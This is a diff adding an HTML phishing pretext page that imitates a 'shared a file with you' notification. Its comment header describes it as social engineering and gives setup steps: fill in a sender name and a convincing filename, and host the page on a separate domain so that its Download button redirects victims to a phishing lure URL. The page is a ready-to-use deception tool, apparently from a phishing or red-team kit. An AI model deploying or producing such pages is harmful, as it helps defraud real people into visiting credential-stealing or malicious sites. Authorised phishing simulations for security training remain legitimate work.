@@ -1,0 +1,38 @@
+<!--
+    File Share Redirector
+
+    A social engineering pretext page that mimics a file sharing notification.
+    The victim clicks "Download" and is redirected to the phishing lure URL.
+    Deploy this page on a separate domain — not on the phishing server.
+
+    Setup:
+    1. Replace SENDER_NAME with the sender's name.
+    2. Replace FILE_NAME with a convincing filename.
+    3. Replace LURE_URL with your phishing lure URL.
+-->
+
+<!doctype html>
+<html lang="en">
+<head>
+    <title>SENDER_NAME shared a file with you</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="min-h-screen bg-blue-600 flex items-center justify-center">
+    <div class="bg-white rounded-2xl shadow-2xl p-10 text-center max-w-sm">
+        <svg class="mx-auto mb-4" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="1.5">
+            <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/>
+            <polyline points="14 2 14 8 20 8"/>
+            <line x1="12" y1="18" x2="12" y2="12"/>
+            <polyline points="9 15 12 12 15 15"/>
+        </svg>
+        <p class="text-lg font-semibold text-gray-900 mb-1">SENDER_NAME</p>
+        <p class="text-gray-500 mb-6">shared a file with you</p>
+        <button onclick="window.location.assign('LURE_URL')"
+            class="w-full py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition-colors">
+            Download FILE_NAME
+        </button>
+    </div>
+</body>
+</html>
